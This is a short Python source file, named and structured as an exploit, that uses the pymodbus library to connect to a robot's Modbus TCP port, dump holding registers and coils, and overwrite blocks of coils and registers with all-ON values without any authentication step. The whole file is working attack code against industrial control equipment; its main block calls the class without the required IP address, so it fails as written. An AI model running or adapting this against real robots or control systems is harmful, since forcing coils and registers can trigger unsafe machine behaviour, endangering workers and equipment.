from pymodbus.client import ModbusTcpClient


# Replace 'robot_ip_address' with the actual IP address of your robot
class ModBusExploit:
    robot_ip_address = '0.0.0.0'  # Default IP address
    port = 502
    client = None
    connection = None

    def __init__(self, ip, port=502):

        self.robot_ip_address = ip
        self.port = port

        # Create a Modbus TCP client instance
        try:

            self.client = ModbusTcpClient(self.robot_ip_address, port)

            self.connection = self.client.connect()
        except Exception:
            print("Could not connect to the modbus on "+ip)

        # Connect to the Modbus server

    def read_registers_and_coils(self, address):

        # Perform Modbus operations (example: read holding registers)
        # Starting address
        count = 10   # Number of registers to read
        result = self.client.read_holding_registers(address, count)
        result_coil = self.client.read_coils(address, count)

        if result_coil:
            print('coil ad #0 to 9: %s' % result_coil)
        else:
            print('unable to read coils')

        if not result.isError():
            print(f"Holding Registers: {result.registers}")
            pass
        else:
            pass
            print("Failed to read holding registers.")

    def write_all_coils_on(self, address):
        # Write value 1 to coils starting from address 0 to 9
        count = 16     # Number of coils to write
        values = [1] * count  # Values to write (all ON)

        result = self.client.write_coils(address, values)

        # print(result)
        if not result.isError():
            print(address)
            print("Successfully wrote value to Coil ")
        else:
            print("Failed to write coils.")

    def write_all_inputs_on_registers(self, address):
        # Write value 1 to digital inputs starting from register address 128
        register_count = 10     # Number of digital inputs to write
        register_values = [1] * register_count  # Values to write (all ON)

        for i in range(register_count):
            result = self.client.write_register(
                address + i, register_values[i])

            if not result.isError():
                print(address)
                print("Successfully wrote value to register ")


if __name__ == "__main__":
    exploit = ModBusExploit()
